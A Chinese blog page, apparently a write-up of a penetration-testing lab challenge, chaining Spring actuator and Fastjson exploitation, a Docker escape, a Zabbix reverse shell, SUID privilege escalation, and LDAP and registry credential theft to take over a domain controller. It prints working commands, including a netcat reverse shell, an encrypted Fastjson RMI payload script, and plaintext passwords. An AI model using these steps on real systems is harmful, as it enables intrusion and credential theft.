<!doctype html><html lang=zh-cn dir=auto data-theme=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>GeatWall_2025 | 0raN9e's Blog</title><meta name=keywords content="docker,springboot,fastjson,ææƒ"><meta name=description content="GeatWall_2025 wp"><meta name=author content><link rel=canonical href=http://blog.0ran9e.cn/posts/%E6%B8%97%E9%80%8F/greatwall2025/><link crossorigin=anonymous href=/assets/css/stylesheet.e145e1800263554e97061ed241e405d710b6a0b880a196a0d6ba58b49d3b9010.css integrity="sha256-4UXhgAJjVU6XBh7SQeQF1xC2oLiAoZag1rpYtJ07kBA=" rel="preload stylesheet" as=style><link rel=icon href=http://blog.0ran9e.cn/favicon.ico><link rel=icon type=image/png sizes=16x16 href=http://blog.0ran9e.cn/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=http://blog.0ran9e.cn/favicon-32x32.png><link rel=apple-touch-icon href=http://blog.0ran9e.cn/apple-touch-icon.png><link rel=mask-icon href=http://blog.0ran9e.cn/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=zh-cn href=http://blog.0ran9e.cn/posts/%E6%B8%97%E9%80%8F/greatwall2025/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51);color-scheme:dark}.list{background:var(--theme)}.toc{background:var(--entry)}}@media(prefers-color-scheme:light){.list::-webkit-scrollbar-thumb{border-color:var(--code-bg)}}</style></noscript><script>localStorage.getItem("pref-theme")==="dark"?document.querySelector("html").dataset.theme="dark":localStorage.getItem("pref-theme")==="light"?document.querySelector("html").dataset.theme="light":window.matchMedia("(prefers-color-scheme: dark)").matches?document.querySelector("html").dataset.theme="dark":document.querySelector("html").dataset.theme="light"</script><meta property="og:url" content="http://blog.0ran9e.cn/posts/%E6%B8%97%E9%80%8F/greatwall2025/"><meta property="og:site_name" content="0raN9e's Blog"><meta property="og:title" content="GeatWall_2025"><meta property="og:description" content="GeatWall_2025 wp"><meta property="og:locale" content="zh-cn"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2025-10-10T00:00:00+00:00"><meta property="article:modified_time" content="2025-10-10T00:00:00+00:00"><meta property="article:tag" content="Docker"><meta property="article:tag" content="Springboot"><meta property="article:tag" content="Fastjson"><meta property="article:tag" content="ææƒ"><meta name=twitter:card content="summary"><meta name=twitter:title content="GeatWall_2025"><meta name=twitter:description content="GeatWall_2025 wp"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"http://blog.0ran9e.cn/posts/"},{"@type":"ListItem","position":3,"name":"GeatWall_2025","item":"http://blog.0ran9e.cn/posts/%E6%B8%97%E9%80%8F/greatwall2025/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"GeatWall_2025","name":"GeatWall_2025","description":"GeatWall_2025 wp","keywords":["docker","springboot","fastjson","ææƒ"],"articleBody":"ä»‹ç» æœ¬åœºæ™¯ä»¥å†…ç½‘å¸¸è§æœåŠ¡ä¸ºåŸºç¡€ï¼Œæ„é€ äº†ä¸€å¥—åŠå…¬ç½‘ç»œç¯å¢ƒï¼Œä½ ç°åœ¨ä½œä¸ºä¸€åæ¸—é€å·¥ç¨‹å¸ˆï¼Œä½ çš„ä»»åŠ¡æ˜¯é€šè¿‡ä¿¡æ¯æ”¶é›†ã€æƒé™æå‡ã€æ¨ªå‘ç§»åŠ¨ã€æœåŠ¡åˆ©ç”¨ç­‰å†…ç½‘æ¸—é€æŠ€æœ¯ï¼Œé€æ­¥è·å–åœºæ™¯å†…çš„4ä¸ªflagä½œä¸ºä½ çš„æˆå°±ç›®æ ‡è¿›è¡Œæäº¤ æ­£å¸¸å…ˆfscanæ‰«ä¸€ä¸‹å†…å®¹\n[2025-10-10 12:57:33] [SUCCESS] ç«¯å£å¼€æ”¾ 8.130.128.178:80 [2025-10-10 12:57:33] [SUCCESS] ç«¯å£å¼€æ”¾ 8.130.128.178:22 [2025-10-10 12:57:33] [SUCCESS] æœåŠ¡è¯†åˆ« 8.130.128.178:22 =\u003e [ssh] ç‰ˆæœ¬:8.9p1 Ubuntu 3ubuntu0.13 äº§å“:OpenSSH ç³»ç»Ÿ:Linux ä¿¡æ¯:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.13.] [2025-10-10 12:57:36] [SUCCESS] ç«¯å£å¼€æ”¾ 8.130.128.178:8080 [2025-10-10 12:57:39] [SUCCESS] æœåŠ¡è¯†åˆ« 8.130.128.178:80 =\u003e [http] [2025-10-10 12:57:51] [SUCCESS] æœåŠ¡è¯†åˆ« 8.130.128.178:8080 =\u003e [http] [2025-10-10 12:57:51] [INFO] å­˜æ´»ç«¯å£æ•°é‡: 3 [2025-10-10 12:57:51] [INFO] å¼€å§‹æ¼æ´æ‰«æ [2025-10-10 12:57:52] [INFO] åŠ è½½çš„æ’ä»¶: ssh, webpoc, webtitle [2025-10-10 12:57:52] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://8.130.128.178 çŠ¶æ€ç :200 é•¿åº¦:10032 æ ‡é¢˜:æ”¿åŠ¡æœåŠ¡å¹³å° - é—¨æˆ·ä¸åŠäº‹å¤§å… [2025-10-10 12:59:03] [SUCCESS] ç›®æ ‡: http://8.130.128.178:8080 æ¼æ´åç§°: poc-yaml-spring-actuator-heapdump-file è¯¦ç»†ä¿¡æ¯: author:AgeloVito links:https://www.cnblogs.com/wyb628/p/8567610.html [2025-10-10 12:59:07] [SUCCESS] ç›®æ ‡: http://8.130.128.178:8080 æ¼æ´åç§°: poc-yaml-springboot-env-unauth è¯¦ç»†ä¿¡æ¯: links:https://github.com/LandGrey/SpringBootVulExploit flag1 æœ‰æ´ç›´æ¥æ‰“ å¯ä»¥ç›´æ¥æ£€æµ‹åˆ°å¯¹åº”çš„cveå•Šï¼Œæ‰“ä¸ªå†…å­˜é©¬è¿›å» ç®€å•çš„ç¿»äº†ç¿»æ²¡æ‰¾åˆ°flag æ‰§è¡Œls -alå‘ç°æœ‰æ–‡ä»¶.dockerenv å°è¯•æ‰§è¡Œ\nfind / -name core_pattern /proc/sys/kernel/core_pattern /host/proc/sys/kernel/core_pattern æŒ‚è½½å®¿ä¸»æœºprocfsé€ƒé€¸è¿™ä¸ªæ¼æ´ï¼Œ å°è¯•gccç¼–è¯‘è„šæœ¬å‘ç°ç¯å¢ƒé‡Œé¢libcä¸é€‚é…ï¼Œä½¿ç”¨cdk cdk-team/CDK: ğŸ“¦ Make security testing of K8s, Docker, and Containerd easier. å‘ç°å¤§æ–‡ä»¶ä¸èƒ½æ­£å¸¸ä¼ è¾“ï¼Œåˆ†å‰²ä¼ è¾“ä¸Šå»\nsplit -b 100k cdk_linux_amd64_upx cdk.part. ä¸Šä¼ ä¹‹åç›´æ¥\ncat cdk.part.* \u003e cdk_linux chmod +x ./cdk_linux ./cdk_linux evaluate --full ./cdk_linux run mount-procfs /host/proc/ \"mkdir /root/.ssh/\" Syntax error: Unterminated quoted stringã€‚å®¹æ˜“å‡ºç°è¿™ä¸ªé—®é¢˜ï¼Œæ³¨æ„ä¸€ä¸‹æ ¼å¼ ä¹‹åæŠŠè‡ªå·±çš„ä¸Šä¼ ä¸Šå»\n./cdk_linux run mount-procfs /host/proc/ 'echo ssh-rsa AAAAB3N4Y........8gFDoRl6pmw== root@kali \u003e /root/.ssh/authorized_keys' ç›´æ¥sshç™»å½•æ‹¿åˆ°flag\nroot@platform:~# cat /flag flag2 æ­£å¸¸æµç¨‹å°±æ˜¯ä¼ fscanç„¶åå†…ç½‘ç©¿é€å·¥å…· çœ‹å†…ç½‘çš„ip\nroot@platform:~# ifconfig docker0: flags=4163 mtu 1500 inet 172.17.0.1 netmask 255.255.0.0 broadcast 172.17.255.255 inet6 fe80::1443:54ff:fe45:d7ef prefixlen 64 scopeid 0x20 ether 16:43:54:45:d7:ef txqueuelen 0 (Ethernet) RX packets 3679 bytes 238067 (238.0 KB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 5462 bytes 7186092 (7.1 MB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 eth0: flags=4163 mtu 1500 inet 172.16.22.12 netmask 255.255.255.0 broadcast 172.16.22.255 inet6 fe80::216:3eff:fe04:7839 prefixlen 64 scopeid 0x20 ether 00:16:3e:04:78:39 txqueuelen 1000 (Ethernet) RX packets 25139 bytes 10649611 (10.6 MB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 26935 bytes 2108965 (2.1 MB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 æµ‹è¯•äº†ä¸€ä¸‹åº”è¯¥æ˜¯ä¸å‡ºç½‘,è¿™é‡Œvshellæ­£å‘ä¸Šçº¿\nscp /home/orange/tcp_linux_amd64 root @8.130.128.178:/tmp ä¹‹åä¸Šä¼ fscanåˆ°æœºå­é‡Œ ä¸Šé¢é‚£ä¸ª172.17.0.1å°±åªæœ‰æœ¬æœºçš„ä¸€äº›ä¸œè¥¿ï¼Œæ²¡æ‰«å‡ºæœ‰ä»€ä¹ˆåˆ©ç”¨çš„ä¸œè¥¿ï¼Œçœ‹ä¸€ä¸‹ä¸‹é¢ä¸€ä¸ª(æ‰«çš„æ—¶å€™ç­‰çš„æ—¶é—´æœ‰ç‚¹é•¿) [2025-10-10 13:43:36] [SUCCESS] ç›®æ ‡ 172.16.22.12 å­˜æ´» (ICMP) [2025-10-10 13:43:36] [SUCCESS] ç›®æ ‡ 172.16.22.14 å­˜æ´» (ICMP) [2025-10-10 13:43:36] [SUCCESS] ç›®æ ‡ 172.16.22.41 å­˜æ´» (ICMP) [2025-10-10 13:43:36] [SUCCESS] ç›®æ ‡ 172.16.22.88 å­˜æ´» (ICMP) [2025-10-10 13:43:36] [SUCCESS] ç›®æ ‡ 172.16.22.253 å­˜æ´» (ICMP) 172.16.22.41 DC:ZWFW\\DC èµ°ä¸ªéš§é“ è®¿é—®http://172.16.22.88/ç›´æ¥ä¸‹è½½apk çŒœæµ‹å’Œ8080æœ‰å…³ï¼Œç›´æ¥åç¼–è¯‘çœ‹ä¸€ä¸‹å†…å®¹ çœ‹ç»„ä»¶åº”è¯¥æ˜¯fastjsonï¼Œä¸»è¦å‘åŒ…çš„ä»£ç åœ¨com.example.mobile.MainActivityé‡Œ\nonCreate()ï¼šåˆå§‹åŒ–ç•Œé¢å¹¶åŠ è½½ Compose ç»„ä»¶ï¼› LoginScreen()ï¼šå®šä¹‰ä¸€ä¸ªç™»å½•ç•Œé¢çš„ UIï¼› sendLoginRequest()ï¼šè´Ÿè´£å‘é€ç™»å½•è¯·æ±‚åˆ°æœåŠ¡å™¨å¹¶è¿”å›ç»“æœã€‚ æ¥æ”¶ä¸‰ä¸ªå‚æ•°ï¼šæœåŠ¡å™¨åœ°å€ã€ç”¨æˆ·åå’Œå¯†ç  è¿™é‡Œç”¨çš„honyå¸ˆå‚…çš„è„šæœ¬ï¼Œä¸å¤ªä¼šé€†å‘ import base64 import os import json import requests from cryptography.hazmat.primitives import serialization, hashes from cryptography.hazmat.primitives.asymmetric import padding from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes from cryptography.hazmat.backends import default_backend # ===== é…ç½®ä¿¡æ¯ =====SERVER_URL = \"http://172.16.22.88:8080/api/login\" # Java ä»£ç ä¸­çš„ RSA å…¬é’¥ï¼ˆBase64 æ ¼å¼ï¼‰ PUBLIC_KEY_B64 = ( \"MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAnKum2FOeaPQumhLBpRauv+OMB6pkdqACjbZYkzzP8CZgjwEwmKauXLxzur1beldNDlVnUs83CnnvanPIYW3oP56t0SoqDmWviBTBJ2aCjtrztFYjBixZEYJ2Exp9f6cdFuSMiucPyuhwY8AuFWnGPJ3Mwt8L8ouV9Lc6Ptp67fCZ0aHr1BVu+pXvHVktbcmeCt+61dnyd9iXTDZfIQ9rwrDsTlkEYORN0hckpFWvgaoNXhXm60ioLkk/qtPZSjir0bpDL0w0iZ3+wRJLtUOe3KyGx+C00S5w2cM0Zw1XlmRQ08yj1nObVkaVsfEU8sSk/XFVnuCrO9YfQCa1uxm5ZQIDAQAB\" ) # ===== 1. è¦å‘é€çš„ JSON æ˜æ–‡ =====plaintext = \"\"\"{ \"@type\": \"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\": \"rmi://172.16.22.12:50388/f94022\", \"autoCommit\": true}\"\"\" print(plaintext) # ===== 2. ç”Ÿæˆéšæœº AES key (128-bit) =====aes_key = os.urandom(16) # ===== 3. AES/GCM åŠ å¯† =====iv = os.urandom(12) # 12 å­—èŠ‚ IVencryptor = Cipher( algorithms.AES(aes_key), modes.GCM(iv), backend=default_backend() ).encryptor() ciphertext = encryptor.update(plaintext.encode(\"utf-8\")) + encryptor.finalize() tag = encryptor.tag # Body = IV + å¯†æ–‡ + GCM tagbody_raw = iv + ciphertext + tag body_b64 = base64.b64encode(body_raw).decode(\"utf-8\") # ===== 4. ç”¨ RSA å…¬é’¥åŠ å¯† AES key =====pub_bytes = base64.b64decode(PUBLIC_KEY_B64) public_key = serialization.load_der_public_key(pub_bytes, backend=default_backend()) enc_key = public_key.encrypt( aes_key, padding.PKCS1v15() ) enc_key_b64 = base64.b64encode(enc_key).decode(\"utf-8\") # ===== 5. å‘é€ POST è¯·æ±‚ =====headers = { \"Content-Type\": \"application/octet-stream\", \"X-Encrypted-Key\": enc_key_b64, } resp = requests.post(SERVER_URL, data=body_b64.encode(\"utf-8\"), headers=headers, timeout=10) print(\"Status:\", resp.status_code) print(\"Response:\", resp.text) åˆ©ç”¨java-chainsï¼ŒæŠŠjdkå’Œjarä¼ åˆ°æœºå­é‡Œé¢(vshellè¿˜æŒºç®€å•ä¼ çš„)å¯åŠ¨ç”¨fastjsonçš„templateslmplçš„bytecodeconverté‡Œé¢æ‰“å…¥å†…å­˜é©¬ å“¥æ–¯æ‹‰è¿æ¥æ‹¿åˆ°flag flag3 å¯¹å…¶ä»–ipè¿›è¡Œæ£€ç´¢\nproxychains4 dirsearch -u http://172.16.22.14 [15:08:28] 200 - 1KB - /zabbix/ è®¿é—®ä¸€ä¸‹ï¼Œç½‘ç»œæ£€ç´¢ä¸€ä¸‹é»˜è®¤çš„å¯†ç \nAdmin/zabbix è¿›å…¥åå°ï¼Œåœ¨å‘Šè­¦è¿™é‡Œçš„è„šæœ¬å¯ä»¥è¾“å…¥å†…å®¹ï¼Œæˆ‘è¾“å‡ºçš„æ˜¯\nwhoami;id åœ¨ç›‘æµ‹è¿™é‡Œçœ‹æœ€æ–°æ•°æ®è¿™é‡Œæœ‰å›æ˜¾ï¼Œæ‰“ä¸€ä¸ªåå¼¹shell\nzabbix uid=115(zabbix) gid=122(zabbix) groups=122(zabbix) æ‰“ä¸ªåå¼¹shellè¿›å»\nbusybox nc 172.16.22.12 5566 -e sh åœ¨å…¥å£æœºncä¸€ä¸‹ç­‰å¾…æ¥æ”¶ ç®€å•çš„ææƒæ‹¿åˆ°flag\nzabbix@zabbix:/$ cat flag.txt cat flag.txt cat: flag.txt: Permission denied zabbix@zabbix:/$ find / -perm -4000 -type f -exec ls -la {} 2\u003e/dev/null \\; find / -perm -4000 -type f -exec ls -la {} 2\u003e/dev/null \\; -rwsr-xr-x 1 root root 30872 Feb 26 2022 /usr/bin/pkexec -rwsr-xr-x 1 root root 35200 Apr 9 2024 /usr/bin/umount -rwsr-xr-x 1 root root 72072 Feb 6 2024 /usr/bin/gpasswd -rwsr-xr-x 1 root root 59976 Feb 6 2024 /usr/bin/passwd -rwsr-xr-x 1 root root 72712 Feb 6 2024 /usr/bin/chfn -rwsr-xr-x 1 root root 35200 Mar 23 2022 /usr/bin/fusermount3 -rwsr-xr-x 1 root root 128072 Mar 24 2022 /usr/bin/ss -rwsr-xr-x 1 root root 55680 Apr 9 2024 /usr/bin/su -rwsr-sr-x 1 daemon daemon 55624 Apr 14 2022 /usr/bin/at -rwsr-xr-x 1 root root 47488 Apr 9 2024 /usr/bin/mount -rwsr-xr-x 1 root root 44808 Feb 6 2024 /usr/bin/chsh -rwsr-xr-x 1 root root 40496 Feb 6 2024 /usr/bin/newgrp -rwsr-xr-x 1 root root 232416 Jun 25 20:48 /usr/bin/sudo è¯»ä¸€ä¸‹flag\nss -a -F /flag.txt flag4 åœ¨åå°çš„ç”¨æˆ·é‡Œçš„è®¤è¯é‡Œï¼Œæœ‰DCçš„æ•°æ®ï¼Œä¸Šé¢æœ‰ç”¨æˆ·ï¼Œä½†æ²¡æœ‰æƒé™çœ‹é…ç½®æ–‡ä»¶ï¼Œçœ‹ä¸€ä¸‹æœåŠ¡å™¨é‡Œçš„å†…å®¹\nzabbix@zabbix:/etc/zabbix$ ls -al ls -al total 76 drwxr-xr-x 5 root root 4096 Sep 3 13:47 . drwxr-xr-x 112 root root 4096 Sep 4 10:32 .. -rw-r--r-- 1 root root 1764 Aug 25 18:15 apache.conf drwxr-xr-x 2 www-data root 4096 Sep 3 13:46 web -rw-r--r-- 1 root root 17323 Aug 25 18:15 zabbix_agentd.conf drwxr-xr-x 2 root root 4096 Aug 25 18:15 zabbix_agentd.d -rw------- 1 root root 31264 Sep 3 13:47 zabbix_server.conf drwxr-xr-x 2 root root 4096 Aug 25 18:15 zabbix_server.d ss -a -F /etc/zabbix/zabbix_server.conf Error: an inet prefix is expected rather than \"LogFile=/var/log/zabbix/zabbix_server.log\". Cannot parse dst/src address. è¿™è¾¹çŒœæµ‹ä¸€äº›æ•°æ®åº“\nmysql -uzabbix -ppassword è¿™é‡Œè¿›å»çœ‹ä¸œè¥¿\nmysql\u003e select * from userdirectory_ldap\\G; select * from userdirectory_ldap\\G; *************************** 1. row *************************** userdirectoryid: 1 host: 172.16.22.41 port: 389 base_dn: OU=Zabbix,DC=zwfw,DC=com search_attribute: sAMAccountName bind_dn: CN=ldapadmin,OU=Zabbix,DC=zwfw,DC=com bind_password: XpVLGkQHm8 start_tls: 0 search_filter: group_basedn: group_name: cn group_member: user_ref_attr: group_filter: group_membership: memberOf user_username: user_lastname: 1 row in set (0.00 sec) ç»™åˆ°äº†å¯†ç ï¼Œbloodhoundæ¢æµ‹ä¸€ä¸‹\nproxychains4 bloodhound-python -u ldapadmin -p 'XpVLGkQHm8' -d zwfw.com -ns 172.16.22.41 -c all --auth-method ntlm --dns-tcp --zip èƒ½ç›´æ¥DCç™»å½•ç„¶åé“¾æ¥åˆ°administrator æµ‹è¯•ä¸€ä¸‹çœ‹æ˜¯å¦èƒ½ç™»å½•\nproxychains4 nxc winrm 172.16.22.41 -u ldapadmin -p XpVLGkQHm8 [proxychains] config file found: /etc/proxychains4.conf [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4 [proxychains] DLL init: proxychains-ng 4.17 [proxychains] Dynamic chain ... 192.168.71.1:6666 ... 172.16.22.41:5985 ... OK WINRM 172.16.22.41 5985 DC [*] 10.0 Build 26100 (name:DC) (domain:zwfw.com) [proxychains] Dynamic chain ... 192.168.71.1:6666 ... 172.16.22.41:5985 ... OK [proxychains] Dynamic chain ... 192.168.71.1:6666 ... 172.16.22.41:5985 ... OK WINRM 172.16.22.41 5985 DC [+] zwfw.com\\ldapadmin:XpVLGkQHm8 (Pwn3d!) ç›´æ¥ç™»å½•\nproxychains4 evil-winrm -i 172.16.22.41 -u ldapadmin -p 'XpVLGkQHm8' è¿™é‡Œç»å…¸æµç¨‹æ¢æµ‹ä¸€ä¸‹\nreg query \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" ç»™åˆ°äº†å¯†ç \nName REG_SZ administrator AutoAdminLogon REG_SZ 1 DefaultPassword REG_SZ a4Z6FcRYSp6LLSGO HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\AlternateShells HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\GPExtensions HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\ShellPrograms HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\UserDefaults HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\AutoLogonChecked HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\VolatileUserMgrKey ç›´æ¥ç™»å½•\nproxychains4 evil-winrm -i 172.16.22.41 -u administrator -p 'a4Z6FcRYSp6LLSGO' æ‹¿åˆ°flag\nC:\\Users\\Administrator\\Documents\u003e cat C:\\Users\\Administrator\\Desktop\\f* åè¯ å¥½ä¹…æ²¡æ°´æ–‡ç« äº†ï¼Œå¥½å¤šå¹´æ²¡æ°´äº†ï¼Œä¼ ä¸€ç¯‡ï¼Œç°åœºå…¶å®ä¹Ÿæ‰“äº†ï¼Œæ¼æ´ä¹Ÿæ‰¾åˆ°äº†ï¼Œæ‰‹ä¸Šå½“æ—¶æ²¡å·¥å…·ï¼Œç¡®å®æœ‰äº›éš¾å´©ï¼Œå…¶ä»–å°±ä¸ç»†è¯´äº†ã€‚æ–‡ç« å¥½å¤šæˆªå›¾éƒ½æ²¡æ”¾ï¼Œç–‘ä¼¼ç”µè„‘å¼€äº†hdrå¯¼è‡´edgeæµè§ˆå™¨æˆªå›¾å¼‚å¸¸æ›å…‰ï¼Œè¿˜æœ‰æˆ‘æ‡’ã€‚see you later.\n","wordCount":"2184","inLanguage":"zh-cn","datePublished":"2025-10-10T00:00:00Z","dateModified":"2025-10-10T00:00:00Z","mainEntityOfPage":{"@type":"WebPage","@id":"http://blog.0ran9e.cn/posts/%E6%B8%97%E9%80%8F/greatwall2025/"},"publisher":{"@type":"Organization","name":"0raN9e's Blog","logo":{"@type":"ImageObject","url":"http://blog.0ran9e.cn/favicon.ico"}}}</script></head><body id=top><header class=header><nav class=nav><div class=logo><a href=http://blog.0ran9e.cn/ accesskey=h title="0raN9e's Blog (Alt + H)">0raN9e's Blog</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=http://blog.0ran9e.cn/ title=é¦–é¡µ><span>é¦–é¡µ</span></a></li><li><a href=http://blog.0ran9e.cn/archives/ title=å½’æ¡£><span>å½’æ¡£</span></a></li><li><a href=http://blog.0ran9e.cn/tags/ title=æ ‡ç­¾><span>æ ‡ç­¾</span></a></li><li><a href=http://blog.0ran9e.cn/search/ title=æœç´¢><span>æœç´¢</span></a></li><li><a href=http://blog.0ran9e.cn/about/ title=å…³äº><span>å…³äº</span></a></li><li><a href=http://blog.0ran9e.cn/links/ title=å‹é“¾><span>å‹é“¾</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><span title='2025-10-10 00:00:00 +0000 UTC'>October 10, 2025</span>&nbsp;Â·&nbsp;<span>5 min</span><h1 class=post-title>GeatWall_2025</h1></header><div class=pm-layout><div class=pm-main><div class=post-content><h1 id=ä»‹ç»>ä»‹ç»</h1><p>æœ¬åœºæ™¯ä»¥å†…ç½‘å¸¸è§æœåŠ¡ä¸ºåŸºç¡€ï¼Œæ„é€ äº†ä¸€å¥—åŠå…¬ç½‘ç»œç¯å¢ƒï¼Œä½ ç°åœ¨ä½œä¸ºä¸€åæ¸—é€å·¥ç¨‹å¸ˆï¼Œä½ çš„ä»»åŠ¡æ˜¯é€šè¿‡ä¿¡æ¯æ”¶é›†ã€æƒé™æå‡ã€æ¨ªå‘ç§»åŠ¨ã€æœåŠ¡åˆ©ç”¨ç­‰å†…ç½‘æ¸—é€æŠ€æœ¯ï¼Œé€æ­¥è·å–åœºæ™¯å†…çš„4ä¸ªflagä½œä¸ºä½ çš„æˆå°±ç›®æ ‡è¿›è¡Œæäº¤
æ­£å¸¸å…ˆfscanæ‰«ä¸€ä¸‹å†…å®¹</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>[</span>2025-10-10 12:57:33<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>SUCCESS<span style=color:#f92672>]</span> ç«¯å£å¼€æ”¾ 8.130.128.178:80
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>2025-10-10 12:57:33<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>SUCCESS<span style=color:#f92672>]</span> ç«¯å£å¼€æ”¾ 8.130.128.178:22
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>2025-10-10 12:57:33<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>SUCCESS<span style=color:#f92672>]</span> æœåŠ¡è¯†åˆ« 8.130.128.178:22 <span style=color:#f92672>=</span>&gt; <span style=color:#f92672>[</span>ssh<span style=color:#f92672>]</span> ç‰ˆæœ¬:8.9p1 Ubuntu 3ubuntu0.13 äº§å“:OpenSSH ç³»ç»Ÿ:Linux ä¿¡æ¯:Ubuntu Linux; protocol 2.0 Banner:<span style=color:#f92672>[</span>SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.13.<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>2025-10-10 12:57:36<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>SUCCESS<span style=color:#f92672>]</span> ç«¯å£å¼€æ”¾ 8.130.128.178:8080
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>2025-10-10 12:57:39<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>SUCCESS<span style=color:#f92672>]</span> æœåŠ¡è¯†åˆ« 8.130.128.178:80 <span style=color:#f92672>=</span>&gt; <span style=color:#f92672>[</span>http<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>2025-10-10 12:57:51<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>SUCCESS<span style=color:#f92672>]</span> æœåŠ¡è¯†åˆ« 8.130.128.178:8080 <span style=color:#f92672>=</span>&gt; <span style=color:#f92672>[</span>http<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>2025-10-10 12:57:51<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>INFO<span style=color:#f92672>]</span> å­˜æ´»ç«¯å£æ•°é‡: <span style=color:#ae81ff>3</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>2025-10-10 12:57:51<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>INFO<span style=color:#f92672>]</span> å¼€å§‹æ¼æ´æ‰«æ
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>2025-10-10 12:57:52<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>INFO<span style=color:#f92672>]</span> åŠ è½½çš„æ’ä»¶: ssh, webpoc, webtitle
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>2025-10-10 12:57:52<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>SUCCESS<span style=color:#f92672>]</span> ç½‘ç«™æ ‡é¢˜ http://8.130.128.178      çŠ¶æ€ç :200 é•¿åº¦:10032  æ ‡é¢˜:æ”¿åŠ¡æœåŠ¡å¹³å° - é—¨æˆ·ä¸åŠäº‹å¤§å…
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>2025-10-10 12:59:03<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>SUCCESS<span style=color:#f92672>]</span> ç›®æ ‡: http://8.130.128.178:8080
</span></span><span style=display:flex><span>  æ¼æ´åç§°: poc-yaml-spring-actuator-heapdump-file
</span></span><span style=display:flex><span>  è¯¦ç»†ä¿¡æ¯: author:AgeloVito
</span></span><span style=display:flex><span>            links:https://www.cnblogs.com/wyb628/p/8567610.html
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>2025-10-10 12:59:07<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>SUCCESS<span style=color:#f92672>]</span> ç›®æ ‡: http://8.130.128.178:8080
</span></span><span style=display:flex><span>  æ¼æ´åç§°: poc-yaml-springboot-env-unauth
</span></span><span style=display:flex><span>  è¯¦ç»†ä¿¡æ¯:
